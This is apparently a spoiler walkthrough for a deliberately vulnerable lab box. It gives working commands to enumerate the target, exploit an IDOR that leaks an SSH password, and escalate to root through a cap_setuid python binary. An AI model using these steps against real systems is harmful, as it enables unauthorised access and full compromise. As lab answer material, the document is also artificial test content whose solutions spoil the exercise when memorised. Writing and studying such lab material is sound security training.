# web-idor - walkthrough (spoilers)

The intended path. The SSH password and flags are randomised per build, so the
only way in is the IDOR, not guessing.

## 1. Recon
The box serves a web app on port 80.

```
nmap -sV <ip>
curl http://<ip>/
```

## 2. IDOR -> leaked credentials
The landing page links to `profile.php?id=2` (a normal customer). The account id
comes straight from the URL with no ownership check, so walk the ids:

```
curl -s "http://<ip>/profile.php?id=1"
```

Account #1 is the service account `svc`, and its note leaks the SSH password (a
random string, unique to this build - not guessable or crackable, so the IDOR is
the only foothold).

## 3. Foothold
```
ssh svc@<ip>            # password from the leaked note
cat ~/user.txt
```

## 4. Privilege escalation (Linux capabilities)
A file capability, not a SUID bit, so `find -perm -4000` misses it. Enumerate
capabilities:

```
getcap -r / 2>/dev/null      # /opt/tools/pyhelper cap_setuid=ep
```

`pyhelper` is a copy of python with `cap_setuid`, so it can set uid 0:

```
/opt/tools/pyhelper -c 'import os; os.setuid(0); os.system("/bin/bash")'
id                            # uid=0(root)
cat /root/root.txt
```

Both flags match `vms/web-idor/flags.txt`, which the build engine writes for the
operator.
